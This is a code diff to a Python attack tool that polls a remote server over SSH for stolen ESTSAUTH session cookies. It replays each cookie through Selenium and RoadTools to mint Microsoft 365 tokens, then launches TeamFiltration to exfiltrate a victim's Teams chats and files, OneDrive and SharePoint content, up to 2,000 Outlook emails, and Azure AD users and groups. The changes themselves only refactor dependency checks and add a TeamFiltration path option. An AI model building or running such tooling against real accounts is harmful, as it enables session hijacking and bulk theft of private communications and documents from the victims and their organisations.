@@ -84,24 +84,25 @@ class LazySeleniumAuthentication(SeleniumAuthentication):
         return driver
 
 
+def default_teamfiltration_filename():
+    if platform.system() == 'Windows':
+        return 'TeamFiltration.exe'
+    else:
+        return 'TeamFiltration'
+    
 def default_geckodriver_filename():
     if platform.system() == 'Windows':
         return 'geckodriver.exe'
     else:
         return 'geckodriver'
 
-def is_teamfiltration_present():
+def is_dependency_present(binary_name):
     """
-    Checks if the TeamFiltration binary is present in the system PATH or current directory.
+    Checks if a given binary is present in the system PATH or current directory.
 
     Returns:
-        bool: True if TeamFiltration is found and executable, False otherwise.
+        bool: True if binary is found and executable, False otherwise.
     """
-    # Construct the basic binary name depending on the operating system
-    binary_name = "TeamFiltration"
-    if platform.system() == "Windows":
-        binary_name += ".exe"
-    
     # Check if the binary is in the current directory and executable
     if os.path.isfile(binary_name) and os.access(binary_name, os.X_OK):
         return True
@@ -147,28 +148,6 @@ def extract_valid_jsons(filename):
     return valid_jsons
  
 
-def is_gecko_driver_present(geckoDriverPath):
-    """
-    Checks if the geckodriver specified by the path is present and executable.
-
-    Args:
-        geckoDriverPath (str): The path to the geckodriver.
-
-    Returns:
-        bool: True if geckodriver is found and executable, False otherwise.
-    """
-    try:
-        # Use LazySeleniumAuthentication to check for geckodriver
-        selauth = LazySeleniumAuthentication(None, None, None, None)
-        service = selauth.get_service(geckoDriverPath)
-        if service:
-            return True
-    except Exception as e:
-        print(f"{ERROR_ICON} An unexpected error occurred when checking for gecko driver: {e}")
-    
-    # If the function hasn't returned True, assume the geckodriver isn't present
-    return False
-
 def download_remote_file(ssh, remote_file, local_file):
     try:
         sftp = ssh.open_sftp()
@@ -178,7 +157,7 @@ def download_remote_file(ssh, remote_file, local_file):
     except Exception as e:
         print(f"{ERROR_ICON} Failed to download file: {e}")
 
-def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, keepOpen, tfArguments=None):
+def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen, tfArguments=None):
     # Attempt to execute the authentication process
     try:
         # Informing the user about the start of the process
@@ -232,30 +211,23 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
         print(f'{INFO_ICON} Tokens were written to {outfilePath}')
     
         # Additional functionality to use TeamFiltration if present
-        if is_teamfiltration_present():
-            # Construct the binary name based on the operating system
-            binary_name = "TeamFiltration"
-            if platform.system() == "Windows":
-                binary_name += ".exe"
+        # Build the command line for TeamFiltration if arguments are provided
+        if tfArguments:
+            commandLine = f"{teamFiltrationPath} --outpath {safeUserName} --roadtools {outfilePath} --exfil"
+            commandLine += " ".join(tfArguments)
+            print(f"{INFO_ICON} Executing: {commandLine}")
+            # Execute the TeamFiltration command
+            process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             
-            # Build the command line for TeamFiltration if arguments are provided
-            if tfArguments:
-                commandLine = f"{binary_name} --outpath {safeUserName} --roadtools {outfilePath} --exfil"
-                commandLine += " ".join(tfArguments)
-                print(f"{INFO_ICON} Executing: {commandLine}")
-                # Execute the TeamFiltration command
-                process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                
-                # Read and display the output line by line
-                for line in iter(process.stdout.readline, ''):
-                    print(line.strip())
-
-                # Wait for the process to finish and get the output
-                stdout, stderr = process.communicate()
-                if stdout:
-                    print(stdout.strip())
-                if stderr:
-                    print(stderr.strip(), file=sys.stderr)
+            # Read and display the output line by line
+            for line in iter(process.stdout.readline, ''):
+                print(line.strip())
+            # Wait for the process to finish and get the output
+            stdout, stderr = process.communicate()
+            if stdout:
+                print(stdout.strip())
+            if stderr:
+                print(stderr.strip(), file=sys.stderr)
 
     # Catch any exception that was not explicitly handled above
     except Exception as e:
@@ -321,7 +293,7 @@ def monitor_remote_database(remote_info, processed_combinations, args):
                     new_combinations = process_combinations(valid_json_objects, processed_combinations)
                     for key, tokenData in new_combinations.items():
                         with ThreadPoolExecutor() as executor:
-                            executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
+                            executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open)
                           
             except Exception as e:
                 print(f"{ERROR_ICON} Error monitoring remote file: {e}")
@@ -374,12 +346,14 @@ if __name__ == "__main__":
     pushover_group.add_argument('--api-token', type=str, required=False, help='Pushover API Token')
 
     teamfiltration_group = arg_parser.add_argument_group('TeamFiltration Options', 'Exfiltration options for TeamFiltration')
+    
     teamfiltration_group.add_argument('--all', action='store_true', help='Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)')
     teamfiltration_group.add_argument('--aad', action='store_true', help='Exfiltrate information from Graph API (domain users and groups)')
     teamfiltration_group.add_argument('--teams', action='store_true', help='Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)')
     teamfiltration_group.add_argument('--onedrive', action='store_true', help='Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the user\'s entire OneDrive directory)')
     teamfiltration_group.add_argument('--owa', action='store_true', help='Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)')
     teamfiltration_group.add_argument('--owa-limit', type=int, help='Set the max amount of emails to exfiltrate, default is 2k.')
+    teamfiltration_group.add_argument('--tf-path', action='store', help='Path to your TeamFiltration file on disk (download from https://github.com/Flangvik/TeamFiltration/releases/latest)',default=default_teamfiltration_filename())
 
     
     roadtools_group = arg_parser.add_argument_group('RoadTools Options', description='RoadTools RoadTX interactive authentication options')
@@ -388,19 +362,24 @@ if __name__ == "__main__":
     roadtools_group.add_argument('-s','--scope',action='store',help='Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.')
     roadtools_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',help='Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',default="https://login.microsoftonline.com/common/oauth2/nativeclient")
     roadtools_group.add_argument('-t','--tenant',action='store',help='Tenant ID or domain to auth to',required=False)
-    roadtools_group.add_argument('-d', '--driver-path',action='store',help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)',default=default_geckodriver_filename())
+    roadtools_group.add_argument('-d', '--driver-path',action='store',help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases/latest)',default=default_geckodriver_filename())
     roadtools_group.add_argument('-k', '--keep-open', action='store_true', help='Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
     
     args = arg_parser.parse_args()
     processed_combinations = set()
 
-    if not is_gecko_driver_present(args.driver_path):
+    if not is_dependency_present(args.tf_path):
+        print(f'{ERROR_ICON} TeamFiltration not found! Required for exfiltration, download from https://github.com/Flangvik/TeamFiltration/releases/latest')
+        exit(0)
+
+    if not is_dependency_present(args.driver_path):
+        print(f'{ERROR_ICON} Geckdriver not found! Required for RoadTools RoadTX, download from https://github.com/mozilla/geckodriver/releases/latest')
         exit(0)
     
     if args.user_key and args.api_token:
         pushover_configured=True
         pushClient = PushoverClient(args.user_key, api_token=args.api_token)
-        print("{INFO_ICON} Pushover notifications activated!")
+        print(f"{INFO_ICON} Pushover notifications activated!")
 
     if args.all:
         tfArguments.append('--all')
@@ -435,5 +414,5 @@ if __name__ == "__main__":
             initial_combinations = process_combinations(valid_json_objects, processed_combinations)
             for key, tokenData in initial_combinations.items():
                 with ThreadPoolExecutor() as executor:
-                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
+                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open)
             time.sleep(5000)
